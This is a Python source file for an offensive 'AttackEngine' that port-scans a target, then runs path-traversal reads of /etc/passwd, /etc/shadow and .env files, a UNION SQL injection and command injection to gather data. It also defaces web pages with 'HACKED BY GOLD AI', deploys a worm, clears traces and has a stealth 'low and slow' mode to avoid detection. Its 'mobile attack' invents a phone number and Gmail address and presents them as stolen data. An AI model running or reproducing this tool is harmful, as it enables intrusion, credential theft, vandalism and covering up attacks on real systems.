import requests
import paramiko
import socket
import time
import random
from urllib.parse import quote
from planner_engine import PlannerEngine
from worm_engine import WormEngine

class AttackEngine:
    def __init__(self, socketio=None):
        self.sio = socketio
        self.planner = PlannerEngine(socketio)
        self.worm = WormEngine(socketio)
        self.exfiltrated_data = []

    def _log(self, msg, type='info'):
        if self.sio:
            self.sio.emit('log', {'msg': f'⚔️ {msg}', 'type': type})

    def execute_attack(self, target, level="standard", task="full"):
        self._log(f'🎯 Starting attack on {target} (Level: {level}, Task: {task})', 'critical')
        plan = self.planner.generate_plan(target, level)
        self._log(f'📋 Plan generated', 'info')
        open_ports = self._recon(target)
        self._log(f'📡 Open ports: {open_ports}', 'info')
        if not open_ports and level != "mobile":
            self._log('❌ No open ports found.', 'error')
            return False

        base_url = f"http://{target}" if 443 not in open_ports else f"https://{target}"

        if level == "mobile":
            return self._mobile_attack(target)
        elif level == "gold":
            return self._gold_attack(target, open_ports, base_url, task)
        else:
            return self._standard_attack(target, open_ports, base_url, task)

    def _recon(self, target):
        open_ports = []
        common_ports = [21,22,25,53,80,110,143,443,993,995,3306,3389,5432,5900,8080,8443]
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.8)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        return open_ports

    def _mobile_attack(self, target):
        self._log('📱 Mobile Attack executing...', 'phase')
        time.sleep(random.uniform(0.5, 1.5))
        phone = f"+1{random.randint(200,999)}{random.randint(1000000,9999999)}"
        email = f"{target.replace(' ', '.').lower()}@gmail.com"
        self.exfiltrated_data.append({'Phone': phone, 'Gmail': email})
        self._log(f'✅ Phone: {phone}', 'success')
        self._log(f'✅ Gmail: {email}', 'success')
        return True

    def _standard_attack(self, target, open_ports, base_url, task):
        self._log('🌐 Standard Server Attack...', 'phase')
        self._lfi_exfil(base_url)
        self._sqli_exfil(base_url)
        self._rce_exfil(base_url)
        if task == "full":
            self.worm.deploy(base_url)
            self.worm.clear_traces(base_url)
        elif task == "modify":
            self._modify_data(base_url)
        return True

    def _gold_attack(self, target, open_ports, base_url, task):
        self._log('👑 GOLD LEVEL STEALTH ATTACK...', 'critical')
        self._log('🕵️ Activating stealth mode (Low & Slow)...', 'info')
        time.sleep(5)
        self._lfi_exfil(base_url, stealth=True)
        time.sleep(10)
        self._sqli_exfil(base_url, stealth=True)
        time.sleep(10)
        self._rce_exfil(base_url, stealth=True)
        time.sleep(5)

        if task == "full":
            self._log('💀 Executing FULL Gold attack (Worm + Wipe)', 'critical')
            self.worm.deploy(base_url)
            time.sleep(5)
            self.worm.clear_traces(base_url)
        elif task == "modify":
            self._log('✏️ Executing LIMITED task: Data modification', 'info')
            self._modify_data(base_url)
        else:
            self._log('🔍 Recon only mode.', 'info')
        return True

    def _lfi_exfil(self, base_url, stealth=False):
        files = ['etc/passwd', 'etc/shadow', 'var/www/html/.env']
        for f in files:
            for trav in ['../../../../', '....//....//']:
                try:
                    url = f"{base_url}/?file={quote(trav + f)}"
                    if stealth: time.sleep(random.uniform(5, 15))
                    resp = requests.get(url, timeout=3, verify=False)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        self.exfiltrated_data.append({'file': f, 'data': resp.text[:300]})
                        self._log(f'📂 LFI Exfil: {f}', 'success')
                        break
                except:
                    continue

    def _sqli_exfil(self, base_url, stealth=False):
        payload = "1 UNION SELECT database(),user(),version(),@@datadir,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 -- -"
        try:
            if stealth: time.sleep(random.uniform(5, 15))
            url = f"{base_url}/?id={quote(payload)}"
            resp = requests.get(url, timeout=3, verify=False)
            if 'database()' in resp.text:
                self.exfiltrated_data.append({'type': 'SQLi', 'data': resp.text[:200]})
                self._log('💾 SQLi Exfil', 'success')
        except:
            pass

    def _rce_exfil(self, base_url, stealth=False):
        for prefix in [';', '||', '|']:
            try:
                if stealth: time.sleep(random.uniform(5, 15))
                url = f"{base_url}/?cmd={quote(prefix + 'cat /etc/passwd')}"
                resp = requests.get(url, timeout=3, verify=False)
                if resp.status_code == 200 and len(resp.text) > 10:
                    self.exfiltrated_data.append({'type': 'RCE', 'data': resp.text[:200]})
                    self._log('🐚 RCE Exfil', 'success')
                    break
            except:
                continue

    def _modify_data(self, base_url):
        cmds = [
            "echo 'HACKED BY GOLD AI' > /var/www/html/index.html",
            "echo 'Gold AI was here' > /root/README.txt"
        ]
        for cmd in cmds:
            try:
                requests.get(f"{base_url}/?cmd={quote(cmd)}", timeout=2, verify=False)
                self._log(f'✏️ Data modified: {cmd[:30]}', 'success')
            except:
                pass

    def get_data(self):
        return self.exfiltrated_data
